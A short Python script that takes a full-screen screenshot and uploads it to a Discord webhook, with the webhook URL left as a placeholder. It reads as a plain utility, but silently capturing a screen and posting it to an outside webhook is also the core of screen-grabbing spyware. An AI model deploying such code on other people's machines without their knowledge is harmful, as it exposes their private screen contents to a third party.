import requests
import pyautogui
import time

# Your Discord Webhook URL
WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"

# Screenshot filename
screenshot_filename = "screenshot.png"

def take_screenshot():
    # Take a screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_filename)

def send_to_discord():
    with open(screenshot_filename, "rb") as file:
        response = requests.post(WEBHOOK_URL, files={"file": file})
        
    if response.status_code == 200:
        print("Screenshot sent successfully!")
    else:
        print(f"Failed to send screenshot! Status code: {response.status_code}, Response: {response.text}")

if __name__ == "__main__":
    take_screenshot()
    time.sleep(1)  # Give it a moment to ensure the file is saved
    send_to_discord()
